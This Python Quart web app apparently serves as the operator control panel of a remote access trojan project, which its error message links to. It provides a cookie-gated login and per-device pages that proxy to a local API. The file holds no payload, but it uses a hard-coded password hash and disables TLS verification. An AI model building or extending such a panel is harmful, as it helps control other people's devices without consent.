__author__ = "赵博凯"
__license__ = "GPL v3"

from quart import Quart, redirect, url_for, request, make_response, render_template, jsonify, websocket
import asyncio
import rich
from sys import exit
import logging
import requests

import rich.traceback 

# 安装rich的回溯追踪，显示本地变量
rich.traceback.install(show_locals=True)

# --- 基础配置 ---
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
app = Quart(__name__)
WEB_PORT = 8000  # Web界面端口
API_PORT = 5000  # API端口
SECURITY_PATH = 'fuck'
SECURITY_PASSWORD_HASH = '6ac3c336e4094835293a3fed8a4b5fedde1b5e2626d9838fed50693bba00af0e'

# --- 全局变量 ---
url_root = f'http://localhost:{API_PORT}/{SECURITY_PATH}'

# --- Quart 网页端逻辑和异步请求处理 ---
def check(cookie):
    if requests.post(f"{url_root}/function", verify=False, cookies=cookie).status_code == 401:
        return False
    return True

@app.route(f'/{SECURITY_PATH}/')
async def index():
    if not check(request.cookies): return redirect(url_for('login'))
    return await render_template('index.html', url_root=url_root)

@app.route(f'/{SECURITY_PATH}/login', methods=['GET', 'POST'])
async def login():
    global headers
    if request.method == 'POST':
        form = await request.form
        password = form.get('password', '')
        response = requests.post(f"{url_root}/verify", json={"password": password})
        if "Cookie" in response.json():
            resp = await make_response(redirect(url_for('index')))
            resp.set_cookie('Cookie', response.json()["Cookie"])
            return resp
        return await render_template('login.html', error='密码错误')
    return await render_template('login.html')

@app.route(f'/{SECURITY_PATH}/logout')
async def logout():
    global headers
    resp = await make_response(redirect(url_for('index')))
    resp.delete_cookie('Cookie')
    return resp

@app.route(f'/{SECURITY_PATH}/device/<id>')
async def device(id):
    if not check(request.cookies): return redirect(url_for('login'))
    return await render_template('device.html', id=id, url_root=url_root)

async def main():
    logging.info("正在启动程序...")
    # 运行WebSocket服务器和连接检查
    await asyncio.gather(
        app.run_task(host='0.0.0.0', port=WEB_PORT)
    )

if __name__ == '__main__':
    try:
        print("\033[H\033[J")
        logging.info("版权所有：Copyright © 赵博凯, All Rights Reserved.")
        asyncio.run(main())
    except KeyboardInterrupt:
        logging.warning("用户手动中断程序。")
        exit()
    except Exception as e:
        logging.error(f"错误: {e}，请报告到[link=https://github.com/zhaobokai341/remote_access_trojan/issues]Issues[/link]")